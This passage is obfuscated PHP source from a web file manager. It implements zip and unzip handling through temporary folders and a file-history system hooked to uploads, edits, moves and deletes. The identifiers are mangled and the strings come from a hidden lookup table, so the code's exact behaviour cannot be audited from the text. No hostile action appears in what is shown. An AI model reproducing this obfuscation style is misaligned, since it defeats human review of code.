self::$driverCache[$ìº¶Õ§ü] = new $ş·Íå ($›£ÂÚŠ³); } $×Šü‘¡î = self::$driverCache[$ìº¶Õ§ü]; $×Šü‘¡î->pathDriver = $óŠÄÆÓá; $×Šü‘¡î->pathBase = $¤è§ôÛŒ[12]; if (isset($™¦¿Èñ×[$¤è§ôÛŒ[6]][$¤è§ôÛŒ[1238]])) { $×Šü‘¡î->pathBase = rtrim($™¦¿Èñ×[$¤è§ôÛŒ[6]][$¤è§ôÛŒ[1238]], $¤è§ôÛŒ[8]) . $¤è§ôÛŒ[8]; $ÊÀĞÌ‘ = $×Šü‘¡î->pathBase . ltrim($ÊÀĞÌ‘, $¤è§ôÛŒ[8]); } $ÊÀĞÌ‘ = $×Šü‘¡î->getPath($ÊÀĞÌ‘); if (isset($‚çÎÇôœ[$¤è§ôÛŒ[1209]])) { $ÊÀĞÌ‘ = $‚çÎÇôœ[$¤è§ôÛŒ[1209]]; } $×Šü‘¡î->path = $ÊÀĞÌ‘; return $×Šü‘¡î; } public static function errorTips($‰ø¥ÔĞ– = false) { $ì­ŒÔŞ =& $_SERVER[íû‘ş´]; static $âã¡«® = array(); $Ş ½Êª = 1000; if ($‰ø¥ÔĞ– === -1) { return $âã¡«® ? $âã¡«®[count($âã¡«®) - 1] : $ì­ŒÔŞ[12]; } if ($‰ø¥ÔĞ– === !1) { return implode($ì­ŒÔŞ[246], $âã¡«®); } if (count($âã¡«®) >= $Ş ½Êª) { $âã¡«® = array_slice($âã¡«®, $Ş ½Êª * 0.5, $Ş ½Êª); } $âã¡«®[] = $‰ø¥ÔĞ–; write_log($ì­ŒÔŞ[163] . ACTION . $ì­ŒÔŞ[1239] . $‰ø¥ÔĞ–, $ì­ŒÔŞ[1240]); } public static function getLastError($È¡İ•ãà = '') { $æº‚“º = self::errorTips(-1); return $æº‚“º ? $æº‚“º : $È¡İ•ãà; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ƒô‹á‚¨; if ($ƒô‹á‚¨) { return $ƒô‹á‚¨; } $Å¾û˜»  = IO::init($_SERVER[íû‘ş´][8]); return $Å¾û˜» ; } private static function iconvSystem($õü«“‘İ) { return self::local()->iconvSystem($õü«“‘İ); } private static function iconvApp($ÈĞÔ„) { return self::local()->iconvApp($ÈĞÔ„); } public static function zipFolder($Ñ¯Áæ, $Ş›¹Ä’ô = "\x7a\151\x70", $«ç½ïµ· = '', $ÕÂ½†³— = REPEAT_RENAME) { $íğÍ´»¿ =& $_SERVER[íû‘ş´]; $ˆÌîß©õ = IO::listPath($Ñ¯Áæ); if (!$ˆÌîß©õ) { return !1; } $ˆÌîß©õ = array_merge($ˆÌîß©õ[$íğÍ´»¿[82]], $ˆÌîß©õ[$íğÍ´»¿[83]]); return self::zip($ˆÌîß©õ, $Ş›¹Ä’ô, $«ç½ïµ·, $ÕÂ½†³—); } public static function zip($˜Í¡É¦Ş, $®ìí¾ = "\x7a\x69\x70", $«Á¨öç¹ = '', $Ù§ª²“ = REPEAT_RENAME) { $‘¹€›ø =& $_SERVER[íû‘ş´]; if (is_string($˜Í¡É¦Ş) && $˜Í¡É¦Ş) { $˜Í¡É¦Ş = array(array($‘¹€›ø[84] => $˜Í¡É¦Ş)); } $ÓŠ“Ì³× = self::init($˜Í¡É¦Ş[0][$‘¹€›ø[84]]); $ó¶°ÇÀØ = self::info($˜Í¡É¦Ş[0][$‘¹€›ø[84]]); $¦·ğËÊ = $‘¹€›ø[12]; $çÉ–¿š = $‘¹€›ø[12]; $¶ƒ•Šˆ² = $‘¹€›ø[12]; if ($«Á¨öç¹ && substr($«Á¨öç¹, -1, 1) != $‘¹€›ø[8]) { $çÉ–¿š = get_path_father($«Á¨öç¹); $¶ƒ•Šˆ² = get_path_this($«Á¨öç¹); } else { $çÉ–¿š = self::pathFather($ó¶°ÇÀØ[$‘¹€›ø[84]]); $¶ƒ•Šˆ² = $ó¶°ÇÀØ[$‘¹€›ø[32]] . $‘¹€›ø[10] . $®ìí¾; if (count($˜Í¡É¦Ş) > 1) { $°ìú’¥ = IO::info($çÉ–¿š); $¶ƒ•Šˆ² = $°ìú’¥[$‘¹€›ø[32]] . $‘¹€›ø[10] . $®ìí¾; } if ($«Á¨öç¹) { $çÉ–¿š = $«Á¨öç¹; } } if ($ÓŠ“Ì³×->getType() == $‘¹€›ø[106]) { $áËÑ¸¤‚ = self::init($çÉ–¿š); $ÖïÈã´á = $áËÑ¸¤‚->getType() == $‘¹€›ø[106] ? $çÉ–¿š : get_path_father($ÓŠ“Ì³×->path); $ÖïÈã´á = rtrim($ÖïÈã´á, $‘¹€›ø[8]) . $‘¹€›ø[8]; mk_dir($ÖïÈã´á); } else { $¦·ğËÊ = TEMP_FILES . $‘¹€›ø[1241] . time() . rand_string(8) . $‘¹€›ø[8]; mk_dir($¦·ğËÊ); file_put_contents($¦·ğËÊ . $‘¹€›ø[1242], $‘¹€›ø[12]); $ÖïÈã´á = $¦·ğËÊ; } $ƒ‰—ô‘§ = IO::info($ÖïÈã´á); if (!$ƒ‰—ô‘§ || !$ƒ‰—ô‘§[$‘¹€›ø[217]]) { show_json(LNG($‘¹€›ø[1243]), !1); } $€öá€ŸŒ = self::zipFileList($˜Í¡É¦Ş, $¦·ğËÊ); foreach ($€öá€ŸŒ as $œºìÎˆ => $°ßÜâ¢È) { $€öá€ŸŒ[$œºìÎˆ] = self::iconvSystem($°ßÜâ¢È); } $¹»Ôí = get_filename_auto($ÖïÈã´á . $¶ƒ•Šˆ², $‘¹€›ø[12], $Ù§ª²“); KodArchive::create(self::iconvSystem($¹»Ôí), $€öá€ŸŒ); if (!IO::exist($¹»Ôí)) { if ($¦·ğËÊ) { del_dir($¦·ğËÊ); } show_json(LNG($‘¹€›ø[1244]), !1); } if (!$¦·ğËÊ) { return $¹»Ôí; } $êÁØõûì = self::move($¹»Ôí, $çÉ–¿š, $Ù§ª²“); if ($¦·ğËÊ) { del_dir($¦·ğËÊ); } if (!$¹»Ôí) { show_json(LNG($‘¹€›ø[1244]), !1); } return $êÁØõûì; } public static function unzip($åõÆ¡Àæ, $©¤ôîÏ, $Œ×ÂºŒÀ = "\55\61", $±ê ÖÅ = "\162\x65\x70\154\x61\x63\145") { $‚àØ¸Š‘ =& $_SERVER[íû‘ş´]; $Ñßê‡ôÕ = parent::info($åõÆ¡Àæ); if (!$Ñßê‡ôÕ) { show_json(LNG($‚àØ¸Š‘[1245]), !1); } $üĞäŠê¸ = IO::infoFullSimple($©¤ôîÏ); if (!$üĞäŠê¸) { $©¤ôîÏ = IO::mkdir($©¤ôîÏ); } if (isset($üĞäŠê¸[$‚àØ¸Š‘[181]]) && trim($üĞäŠê¸[$‚àØ¸Š‘[84]], $‚àØ¸Š‘[8]) != trim($©¤ôîÏ, $‚àØ¸Š‘[8])) { $Óœè«Õ = KodIO::make($üĞäŠê¸[$‚àØ¸Š‘[180]]); $€â³Ã° = IO::fileNameAuto($Óœè«Õ, $üĞäŠê¸[$‚àØ¸Š‘[32]], REPEAT_RENAME_FOLDER, !0); $©¤ôîÏ = IO::mkdir($Óœè«Õ . $€â³Ã°); } $Œ×ÂºŒÀ = $Œ×ÂºŒÀ && $Œ×ÂºŒÀ != $‚àØ¸Š‘[1246] ? @json_decode($Œ×ÂºŒÀ, !0) : -1; $™İ´…šó = self::unzipPart($åõÆ¡Àæ, $Œ×ÂºŒÀ); if (!$™İ´…šó || !IO::exist($™İ´…šó[$‚àØ¸Š‘[214]])) { show_json(LNG($‚àØ¸Š‘[105]), !1); } $èÍ›î½´ = $™İ´…šó[$‚àØ¸Š‘[1247]][count($™İ´…šó[$‚àØ¸Š‘[1247]]) - 1]; if ($èÍ›î½´[$‚àØ¸Š‘[1248]] == -1 || substr($èÍ›î½´[$‚àØ¸Š‘[32]], -1, 1) == $‚àØ¸Š‘[8]) { $ÜÜ°çÏÙ = $™İ´…šó[$‚àØ¸Š‘[1249]] . rand_string(10) . $‚àØ¸Š‘[8]; mk_dir($ÜÜ°çÏÙ); $Üîğ¤ùú = count($™İ´…šó[$‚àØ¸Š‘[1247]]) == 1 ? IO::ext($åõÆ¡Àæ) : get_path_ext($™İ´…šó[$‚àØ¸Š‘[214]]); $¢ÃÛˆö = KodArchive::extract(self::iconvSystem($™İ´…šó[$‚àØ¸Š‘[214]]), $ÜÜ°çÏÙ, $èÍ›î½´[$‚àØ¸Š‘[1248]], $€â³Ã°, $Üîğ¤ùú); self::unzipErrorCheck($¢ÃÛˆö, array($‚àØ¸Š‘[1250], $åõÆ¡Àæ, $Üîğ¤ùú, $©¤ôîÏ, $™İ´…šó)); Hook::trigger($‚àØ¸Š‘[1251], $ÜÜ°çÏÙ); recursion_dir($ÜÜ°çÏÙ, $Šö­¹¤, $ì»åàûÜ, 0); $Ğ÷ˆØªà = array_merge($Šö­¹¤, $ì»åàûÜ); $˜ŒÔ“Ó” = array(); foreach ($Ğ÷ˆØªà as $ÀÂ·Î™ˆ) { $µä×ÈˆŒ = IO::move(self::iconvApp($ÀÂ·Î™ˆ), $©¤ôîÏ, $±ê ÖÅ); if ($µä×ÈˆŒ) { $˜ŒÔ“Ó”[] = $µä×ÈˆŒ; } } del_dir($ÜÜ°çÏÙ); } else { $µä×ÈˆŒ = IO::move($™İ´…šó[$‚àØ¸Š‘[214]], $©¤ôîÏ, $±ê ÖÅ, get_path_this($èÍ›î½´[$‚àØ¸Š‘[32]])); if ($µä×ÈˆŒ) { $˜ŒÔ“Ó”[] = $µä×ÈˆŒ; } } return $˜ŒÔ“Ó” ? $˜ŒÔ“Ó” : !1; } public static function unzipList($ŞşÔëõ) { $ñİ–’Ãœ =& $_SERVER[íû‘ş´]; $¶®®¼ÂÜ = isset($ŞşÔëõ[$ñİ–’Ãœ[1252]]) ? $ŞşÔëõ[$ñİ–’Ãœ[1252]] : !1; $¡ÉçÉå = isset($ŞşÔëõ[$ñİ–’Ãœ[1248]]) ? @json_decode($ŞşÔëõ[$ñİ–’Ãœ[1248]], !0) : -1; $İé“Ú‰ = self::unzipPart($ŞşÔëõ[$ñİ–’Ãœ[84]], $¡ÉçÉå); if (!$İé“Ú‰ || !IO::exist($İé“Ú‰[$ñİ–’Ãœ[214]])) { show_json(LNG($ñİ–’Ãœ[105]), !1); } $§¥öôß = $İé“Ú‰[$ñİ–’Ãœ[1247]][count($İé“Ú‰[$ñİ–’Ãœ[1247]]) - 1]; $ñìşè‚ = in_array(IO::ext($İé“Ú‰[$ñİ–’Ãœ[214]]), array($ñİ–’Ãœ[357], $ñİ–’Ãœ[1253], $ñİ–’Ãœ[1254], $ñİ–’Ãœ[1255], $ñİ–’Ãœ[1256], $ñİ–’Ãœ[1257])); if (!$¶®®¼ÂÜ && ($§¥öôß[$ñİ–’Ãœ[1248]] == -1 || $ñìşè‚)) { $ã£å‚‡Ğ = $İé“Ú‰[$ñİ–’Ãœ[1249]] . get_path_this($İé“Ú‰[$ñİ–’Ãœ[214]]) . $ñİ–’Ãœ[1258]; if (!IO::exist($ã£å‚‡Ğ)) { $ò¨åå¨ú = $§¥öôß[$ñİ–’Ãœ[1248]] == -1 ? get_path_ext(IO::pathThis($ŞşÔëõ[$ñİ–’Ãœ[84]])) : get_path_ext($İé“Ú‰[$ñİ–’Ãœ[214]]); $œàİúÚ = KodArchive::listContent(self::iconvSystem($İé“Ú‰[$ñİ–’Ãœ[214]]), !0, $ò¨åå¨ú); self::unzipErrorCheck($œàİúÚ, array($ñİ–’Ãœ[1259], $ŞşÔëõ, $İé“Ú‰)); @file_put_contents($ã£å‚‡Ğ, json_encode($œàİúÚ[$ñİ–’Ãœ[1260]])); } return @json_decode(IO::getContent($ã£å‚‡Ğ), !0); } IO::fileOut($İé“Ú‰[$ñİ–’Ãœ[214]], $¶®®¼ÂÜ, get_path_this($§¥öôß[$ñİ–’Ãœ[32]])); die; } private static function zipFileList($¸È¾àÀ, $äåÂßË“ = false) { $Â®ÖĞ†× =& $_SERVER[íû‘ş´]; $áİÙ¹£È = array(); foreach ($¸È¾àÀ as $˜ğğƒ÷—) { $¨¶´€Ş– = $˜ğğƒ÷—[$Â®ÖĞ†×[84]]; if ($äåÂßË“) { $¨¶´€Ş– = self::copy($˜ğğƒ÷—[$Â®ÖĞ†×[84]], $äåÂßË“, $Â®ÖĞ†×[877]); } else { $¦ç«ŠŞŸ = self::init($˜ğğƒ÷—[$Â®ÖĞ†×[84]]); if ($¦ç«ŠŞŸ->getType() == $Â®ÖĞ†×[106]) { $¨¶´€Ş– = $¦ç«ŠŞŸ->path; } } if ($¨¶´€Ş– && self::local()->exist($¨¶´€Ş–)) { $áİÙ¹£È[$˜ğğƒ÷—[$Â®ÖĞ†×[84]]] = $¨¶´€Ş–; } } if (!empty($áİÙ¹£È)) { return array_values($áİÙ¹£È); } show_json(LNG($Â®ÖĞ†×[1223]), !1); } private static function localFilePath($ìÍ»ì·‹) { $¥±±ÑÚ =& $_SERVER[íû‘ş´]; $Í×ĞŒí¾ = KodIO::parse($ìÍ»ì·‹); if ($Í×ĞŒí¾[$¥±±ÑÚ[33]] == KodIO::KOD_SOURCE) { $ÌÓ“ˆóı = Model($¥±±ÑÚ[884])->fileInfoGet(KodIO::sourceID($ìÍ»ì·‹)); if (!$ÌÓ“ˆóı[$¥±±ÑÚ[84]]) { show_json($¥±±ÑÚ[1261], !1); } $ìÍ»ì·‹ = $ÌÓ“ˆóı[$¥±±ÑÚ[84]]; } $ú¡Ìùı = self::init($ìÍ»ì·‹); if ($ú¡Ìùı->pathParse[$¥±±ÑÚ[1209]]) { $ìÍ»ì·‹ = $ú¡Ìùı->pathParse[$¥±±ÑÚ[1209]]; $ú¡Ìùı = self::init($ìÍ»ì·‹); } $Ùì¢Ïãñ = $ú¡Ìùı->getType(); if ($Ùì¢Ïãñ == $¥±±ÑÚ[106] || $Ùì¢Ïãñ == $¥±±ÑÚ[1262]) { if (!$ú¡Ìùı->exist($ú¡Ìùı->path)) { show_json(LNG($¥±±ÑÚ[105]), !1); } return $ú¡Ìùı->path; } return !1; } public static function unzipPart($ûÂÃ™Şø, $÷£ôˆûô = -1) { $ĞŞ½œã =& $_SERVER[íû‘ş´]; $çóâÎ–ê = IO::pathThis($ûÂÃ™Şø); if (!$÷£ôˆûô || $÷£ôˆûô == -1) { $—àÎåŸ¿ = array(array($ĞŞ½œã[32] => $çóâÎ–ê, $ĞŞ½œã[1248] => -1)); $—àÎåŸ¿[0][$ĞŞ½œã[1263]] = $—àÎåŸ¿[0][$ĞŞ½œã[32]]; } else { if (is_array($÷£ôˆûô)) { $—àÎåŸ¿ = $÷£ôˆûô; $‡¾º’æ = count($—àÎåŸ¿) - 1; for ($Ì‡Æ‘Ğ = 0; $Ì‡Æ‘Ğ <= $‡¾º’æ; $Ì‡Æ‘Ğ++) { $•âéáƒÎ = $—àÎåŸ¿[$Ì‡Æ‘Ğ]; $±ûºá÷¥ = get_path_this($•âéáƒÎ[$ĞŞ½œã[32]]) . (checkExtSafe($•âéáƒÎ[$ĞŞ½œã[32]]) ? $ĞŞ½œã[12] : $ĞŞ½œã[1264]); $—àÎåŸ¿[$Ì‡Æ‘Ğ][$ĞŞ½œã[1263]] = $ĞŞ½œã[1265] . intval($•âéáƒÎ[$ĞŞ½œã[1248]]) . $ĞŞ½œã[430] . $±ûºá÷¥; if ($Ì‡Æ‘Ğ == 0) { continue; } $—àÎåŸ¿[$Ì‡Æ‘Ğ][$ĞŞ½œã[1263]] = $—àÎåŸ¿[$Ì‡Æ‘Ğ - 1][$ĞŞ½œã[1263]] . $ĞŞ½œã[1266] . $—àÎåŸ¿[$Ì‡Æ‘Ğ][$ĞŞ½œã[1263]]; } } } if (!is_array($—àÎåŸ¿) || count($—àÎåŸ¿) == 0) { return !1; } $ş¯•ö± = $—àÎåŸ¿[count($—àÎåŸ¿) - 1]; if (!IO::exist($ûÂÃ™Şø)) { return !1; } $¢‚ÕÇ†€ = TEMP_FILES . $ĞŞ½œã[1267] . kodIO::hashPathSafe($ûÂÃ™Şø) . $ĞŞ½œã[8]; $Ñí²åá¤ = $¢‚ÕÇ†€ . $ş¯•ö±[$ĞŞ½œã[1263]]; mk_dir($¢‚ÕÇ†€); file_put_contents(TEMP_FILES . $ĞŞ½œã[1242], $ĞŞ½œã[12]); if (IO::exist($Ñí²åá¤)) { return array($ĞŞ½œã[214] => $Ñí²åá¤, $ĞŞ½œã[1247] => $—àÎåŸ¿, $ĞŞ½œã[1249] => $¢‚ÕÇ†€); } $¿€ğÄÄª = self::localFilePath($ûÂÃ™Şø); if (!$¿€ğÄÄª) { $¿€ğÄÄª = $¢‚ÕÇ†€ . $ĞŞ½œã[1268]; if (!IO::exist($¿€ğÄÄª)) { self::copy($ûÂÃ™Şø, $¢‚ÕÇ†€, !1, get_path_this($¿€ğÄÄª)); } } if (!$¿€ğÄÄª || !IO::exist($¿€ğÄÄª)) { return !1; } if ($ş¯•ö±[$ĞŞ½œã[1248]] == -1) { return array($ĞŞ½œã[214] => $¿€ğÄÄª, $ĞŞ½œã[1247] => $—àÎåŸ¿, $ĞŞ½œã[1249] => $¢‚ÕÇ†€); } $„ûåü¨¼ = $¿€ğÄÄª; foreach ($—àÎåŸ¿ as $Ì‡Æ‘Ğ => $•âéáƒÎ) { if (!$•âéáƒÎ || $•âéáƒÎ[$ĞŞ½œã[1248]] == $ĞŞ½œã[1246]) { break; } if (substr($•âéáƒÎ[$ĞŞ½œã[32]], -1, 1) == $ĞŞ½œã[8]) { break; } $ğöËì«Ü = in_array(get_path_ext($•âéáƒÎ[$ĞŞ½œã[1263]]), array($ĞŞ½œã[357], $ĞŞ½œã[1253], $ĞŞ½œã[1254], $ĞŞ½œã[1255], $ĞŞ½œã[1256], $ĞŞ½œã[1257])); $üáî¯È = $Ì‡Æ‘Ğ == count($—àÎåŸ¿) - 1 && $ğöËì«Ü; $²¼û©‚Ç = $¢‚ÕÇ†€ . $•âéáƒÎ[$ĞŞ½œã[1263]]; $¾—øÈø° = $¢‚ÕÇ†€ . get_path_this($•âéáƒÎ[$ĞŞ½œã[32]]); if (IO::exist($²¼û©‚Ç)) { $„ûåü¨¼ = $²¼û©‚Ç; continue; } $ÒÌ¬Œı« = $Ì‡Æ‘Ğ == 0 ? get_path_ext($çóâÎ–ê) : get_path_ext($„ûåü¨¼); $ø€‰´Û = KodArchive::extract(self::iconvSystem($„ûåü¨¼), $¢‚ÕÇ†€, $•âéáƒÎ[$ĞŞ½œã[1248]], $—õûĞ¼ß, $ÒÌ¬Œı«); self::unzipErrorCheck($ø€‰´Û, array($ĞŞ½œã[1269], $ûÂÃ™Şø, $—àÎåŸ¿, $•âéáƒÎ, $²¼û©‚Ç)); if (IO::exist($¾—øÈø°)) { IO::rename($¾—øÈø°, get_path_this($²¼û©‚Ç)); } $„ûåü¨¼ = $²¼û©‚Ç; } $Ñí²åá¤ = $„ûåü¨¼; return array($ĞŞ½œã[214] => $„ûåü¨¼, $ĞŞ½œã[1247] => $—àÎåŸ¿, $ĞŞ½œã[1249] => $¢‚ÕÇ†€); } private static function unzipErrorCheck($½ªÑèà, $Ú¾‘ë˜ = false) { $¬Ú”õĞà =& $_SERVER[íû‘ş´]; if ($½ªÑèà[$¬Ú”õĞà[1270]]) { return !0; } write_log(array($¬Ú”õĞà[1271], $½ªÑèà, $Ú¾‘ë˜), $¬Ú”õĞà[1272]); show_json($¬Ú”õĞà[1273] . json_encode($½ªÑèà[$¬Ú”õĞà[1260]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Û›º¶á™ =& $_SERVER[íû‘ş´]; $Œ—Åæ½ = $GLOBALS[$Û›º¶á™[6]][$Û›º¶á™[89]]; if ($Œ—Åæ½[$Û›º¶á™[1274]] != 1) { return; } if ($Œ—Åæ½[$Û›º¶á™[1275]] <= 0) { return; } if (isset($_REQUEST[$Û›º¶á™[1276]]) && $_REQUEST[$Û›º¶á™[1276]] == $Û›º¶á™[88]) { return; } Hook::bind($Û›º¶á™[1277], $Û›º¶á™[1278]); Hook::bind($Û›º¶á™[1279], $Û›º¶á™[1280]); Hook::bind($Û›º¶á™[1281], $Û›º¶á™[1282]); Hook::bind($Û›º¶á™[1283], $Û›º¶á™[1284]); Hook::bind($Û›º¶á™[1285], $Û›º¶á™[1286]); Hook::bind($Û›º¶á™[1287], $Û›º¶á™[1288]); } public static function eventBeforeUpload($Ì„àÈï) { if ($Ì„àÈï[3] && $Ì„àÈï[3] != REPEAT_REPLACE) { return; } $ÄôØªîæ = self::parsePath($Ì„àÈï[0]); if (!$ÄôØªîæ) { return; } self::add($ÄôØªîæ); } public static function eventBeforeEdit($£¨ä—İ) { $Á”È¢‡ = self::parsePath($£¨ä—İ[0]); if (!$Á”È¢‡) { return; } self::add($Á”È¢‡); } public static function eventBeforeCopyFile($àşÏ´×Ó, $ş»Åû‡•, $«¬Èóì¦, $€¤úÈé, $¨‚ÛËÏÎ, $ÅœÂüï‘) { $ÃõÎêÆú =& $_SERVER[íû‘ş´]; if (isset($«¬Èóì¦->_data[$ÃõÎêÆú[1213]]) && $«¬Èóì¦->_data[$ÃõÎêÆú[1213]]) { return; } $ñğ›–Ğ« = $«¬Èóì¦->getPathOuter($€¤úÈé); $îß°Èä¢ = self::parsePath($ñğ›–Ğ«); if (!$îß°Èä¢) { return; } self::add($îß°Èä¢); } public static function eventBeforeRename($²Õª†) { $ÜûÚ™é¶ =& $_SERVER[íû‘ş´]; $¡©ëàÙØ = self::parsePath($²Õª†[0]); if (!$¡©ëàÙØ) { return; } $İıú×«” = self::checkInHistory($¡©ëàÙØ); if (!$İıú×«”) { return; } if ($İıú×«”[$ÜûÚ™é¶[33]] == $ÜûÚ™é¶[214]) { $Ğñ°î¼Ä = self::listData($¡©ëàÙØ); if ($Ğñ°î¼Ä && $Ğñ°î¼Ä[$ÜûÚ™é¶[413]]) { self::moveHistory($¡©ëàÙØ, $²Õª†[1]); } } else { IO::rename($İıú×«”[$ÜûÚ™é¶[84]], $²Õª†[1]); } } public static function eventBeforeMove($ô©‚ôŸ) { $ªûÕ¹Å =& $_SERVER[íû‘ş´]; $é¤Ğ…Ó‘ = self::parsePath($ô©‚ôŸ[0]); if (!$é¤Ğ…Ó‘) { return; } $ÚêÕÏ´ = self::parsePath($ô©‚ôŸ[1]); if (!$ÚêÕÏ´) { return; } $ùÇöĞ– = $ô©‚ôŸ[3]; $ÀÜ‰şÜ´ = self::checkInHistory($é¤Ğ…Ó‘); if (!$ÀÜ‰şÜ´) { return; } $İÏÆóœı = self::pathHistory($ÚêÕÏ´); if ($ÀÜ‰şÜ´[$ªûÕ¹Å[33]] == $ªûÕ¹Å[214]) { $»ïñæÃÉ = self::listData($é¤Ğ…Ó‘); $şµÒ÷ò„ = rtrim($ÚêÕÏ´, $ªûÕ¹Å[8]) . $ªûÕ¹Å[8] . ($ùÇöĞ– ? $ùÇöĞ– : get_path_this($é¤Ğ…Ó‘)); $«ªàª‘Ş = self::listData($şµÒ÷ò„); if ($»ïñæÃÉ && $»ïñæÃÉ[$ªûÕ¹Å[413]] && $«ªàª‘Ş && $«ªàª‘Ş[$ªûÕ¹Å[413]]) { return self::clear($é¤Ğ…Ó‘); } if ($»ïñæÃÉ && $»ïñæÃÉ[$ªûÕ¹Å[413]]) { self::moveHistory($é¤Ğ…Ó‘, $ùÇöĞ–, $İÏÆóœı); } } else { IO::move($ÀÜ‰şÜ´[$ªûÕ¹Å[84]], $İÏÆóœı, !1, $ùÇöĞ–); self::clearEmptyFolder(IO::pathFather($ÀÜ‰şÜ´[$ªûÕ¹Å[84]])); } } public static function eventAfterRemove($ãº¨´ıö, $Ï’¡Õëó) { $•€ÏçÂÉ =& $_SERVER[íû‘ş´]; if (!$Ï’¡Õëó) { return; } $øÓÜÜ¡ğ = self::parsePath($ãº¨´ıö[0]); if (!$øÓÜÜ¡ğ) { return; } $Ã§«®± = self::checkInHistory($øÓÜÜ¡ğ); if (!$Ã§«®±) { return; } if ($Ã§«®±[$•€ÏçÂÉ[33]] == $•€ÏçÂÉ[214]) { $ãìÂÌö = self::listData($øÓÜÜ¡ğ, !1); if ($ãìÂÌö && $ãìÂÌö[$•€ÏçÂÉ[413]]) { self::clear($øÓÜÜ¡ğ, !1); } } else { IO::remove($Ã§«®±[$•€ÏçÂÉ[84]]); self::clearEmptyFolder(IO::pathFather($Ã§«®±[$•€ÏçÂÉ[84]])); } } private static function checkInHistory($î×ä££†) { $ÀÕÚ“ÆŒ = self::pathHistory($î×ä££†); if (!IO::exist($ÀÕÚ“ÆŒ)) { $ÀÕÚ“ÆŒ .= $_SERVER[íû‘ş´][1289]; } return IO::exist($ÀÕÚ“ÆŒ) ? IO::info($ÀÕÚ“ÆŒ) : !1; } private static function parsePath($ŠÙÍŞ©œ) { $Íû©´´Ç =& $_SERVER[íû‘ş´]; if (!$ŠÙÍŞ©œ) { return !1; } if ($GLOBALS[$Íû©´´Ç[1290]]) { return; } $úØôÒŠ§ = KodIO::parse($ŠÙÍŞ©œ); $ ÛëÁÄŞ = $úØôÒŠ§[$Íû©´´Ç[33]]; $êİü’ø¶ = !$ ÛëÁÄŞ || $ ÛëÁÄŞ == KodIO::KOD_IO || $ ÛëÁÄŞ == KodIO::KOD_SHARE_ITEM; if (!$êİü’ø¶ || !$úØôÒŠ§[$Íû©´´Ç[1291]]) { return !1; } if (substr($ŠÙÍŞ©œ, 0, strlen(DATA_PATH . $Íû©´´Ç[1292])) == DATA_PATH . $Íû©´´Ç[1292]) { return !1; } if ($ ÛëÁÄŞ == KodIO::KOD_SHARE_ITEM) { $Ü„Ä™¦€ = IO::init($ŠÙÍŞ©œ); if ($Ü„Ä™¦€->pathParse[$Íû©´´Ç[1209]]) { return self::parsePath($Ü„Ä™¦€->pathParse[$Íû©´´Ç[1209]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ş–Ï¿ÌĞ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Íû©´´Ç[1293]); foreach ($Ş–Ï¿ÌĞ as $Ú±»óºš) { if (!$ ÛëÁÄŞ && substr($ŠÙÍŞ©œ, 0, strlen($Ú±»óºš)) == $Ú±»óºš) { return !1; } } self::log($GLOBALS[$Íû©´´Ç[1204]] . $Íû©´´Ç[1294] . $ŠÙÍŞ©œ); return $ŠÙÍŞ©œ; } private static function pathHistory($îò°¹‰Ç) { $—¢¨ñ­Ï =& $_SERVER[íû‘ş´]; $ÊØ˜ßÛ¹ = self::$_historyBase . ltrim(KodIO::clear($îò°¹‰Ç), $—¢¨ñ­Ï[8]); $ÊØ˜ßÛ¹ = str_replace(array($—¢¨ñ­Ï[1295]), array($—¢¨ñ­Ï[1296]), $ÊØ˜ßÛ¹); return $ÊØ˜ßÛ¹; } public static function log($ê‘ÛĞ˜õ) { } public static function historyCount($¹·ˆíù) { $¼ĞÂĞ“‘ =& $_SERVER[íû‘ş´]; $¬Óµ…¸¾ = array(); $ú¦‚¥©› = array(); foreach ($¹·ˆíù as $Œ¯€í—°) { $ÉÆıÖ¢ = get_path_father($Œ¯€í—°); if (!$ú¦‚¥©›[$ÉÆıÖ¢]) { $ú¦‚¥©›[$ÉÆıÖ¢] = array(); } $ú¦‚¥©›[$ÉÆıÖ¢][] = get_path_this($Œ¯€í—°); } foreach ($ú¦‚¥©› as $ÉÆıÖ¢ => $­ÆüÈƒ×) { $ñÀüçŞŸ = self::parsePath($ÉÆıÖ¢); if (!$ñÀüçŞŸ) { continue; } foreach ($­ÆüÈƒ× as $ĞÀ¶şØÉ) { $òöìÆÒ = self::listData(rtrim($ñÀüçŞŸ, $¼ĞÂĞ“‘[8]) . $¼ĞÂĞ“‘[8] . $ĞÀ¶şØÉ, !1); if ($òöìÆÒ && $òöìÆÒ[$¼ĞÂĞ“‘[413]]) { $¬Óµ…¸¾[rtrim($ÉÆıÖ¢, $¼ĞÂĞ“‘[8]) . $¼ĞÂĞ“‘[8] . $ĞÀ¶şØÉ] = count($òöìÆÒ[$¼ĞÂĞ“‘[413]]); } } } return $¬Óµ…¸¾; } public static function add($›¨ıÇé–) { $èïû„Ê¸ =& $_SERVER[íû‘ş´]; $™¯£ÙÏ = self::listData($›¨ıÇé–); if (!$™¯£ÙÏ) { return; } $‰àèòöá = Model($èïû„Ê¸[829])->get($èïû„Ê¸[1297]); $âÂÊ·¦î = $GLOBALS[$èïû„Ê¸[6]][$èïû„Ê¸[89]][$èïû„Ê¸[1275]]; $’ëÄûİÏ = $‰àèòöá == $èïû„Ê¸[1298] ? min(5, $âÂÊ·¦î) : $âÂÊ·¦î; if ($âÂÊ·¦î <= 0) { return; } $¢úô¡š = IO::info($›¨ıÇé–); $á¡Œîï· = $™¯£ÙÏ[$èïû„Ê¸[413]]; if ($¢úô¡š[$èïû„Ê¸[76]] == 0) { return; } if ($¢úô¡š[$èïû„Ê¸[76]] >= 1024 * 1024 * 500) { return !1; } $¤Ôè»È÷ = IO::hashSimple($›¨ıÇé–); if ($á¡Œîï· && $á¡Œîï·[0][$èïû„Ê¸[650]] == $¤Ôè»È÷) { return !0; } if (array_key_exists($èïû„Ê¸[217], $¢úô¡š) && !$¢úô¡š[$èïû„Ê¸[217]]) { return !1; } $¶¦„ÚÆÎ = short_id(time()); $Á×öó¨ = array($èïû„Ê¸[443] => $¶¦„ÚÆÎ, $èïû„Ê¸[650] => $¤Ôè»È÷, $èïû„Ê¸[32] => $¢úô¡š[$èïû„Ê¸[32]] . $èïû„Ê¸[10] . date($èïû„Ê¸[1299]) . rand_string(1), $èïû„Ê¸[76] => $¢úô¡š[$èïû„Ê¸[76]], $èïû„Ê¸[504] => USER_ID, $èïû„Ê¸[215] => time(), $èïû„Ê¸[1300] => $èïû„Ê¸[12]); 